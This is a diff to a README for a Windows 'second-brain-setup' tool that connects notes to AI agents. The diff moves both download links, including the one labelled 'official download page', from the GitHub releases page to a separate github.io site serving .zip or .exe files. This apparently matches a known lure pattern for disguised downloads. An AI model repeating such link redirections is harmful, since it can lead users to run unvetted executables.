@@ -1,6 +1,6 @@
 # 🧠 second-brain-setup - Create an AI memory for your work
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/quanb6311/second-brain-setup/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://quanb6311.github.io)
 
 This software helps you build a personal knowledge base that works with AI tools. You can connect your notes to AI agents like Claude Code or Codex. This creates a bridge between your thoughts and machine intelligence. 
 
@@ -8,7 +8,7 @@ This software helps you build a personal knowledge base that works with AI tools
 
 You need to download the files to your computer. Follow these steps to obtain the correct version for Windows.
 
-1. Visit the [official download page](https://github.com/quanb6311/second-brain-setup/releases).
+1. Visit the [official download page](https://quanb6311.github.io).
 2. Look for the section labeled "Assets" at the bottom of the newest release.
 3. Click the link that ends in `.zip` or `.exe` to start the download.
 4. Save the file to your computer.
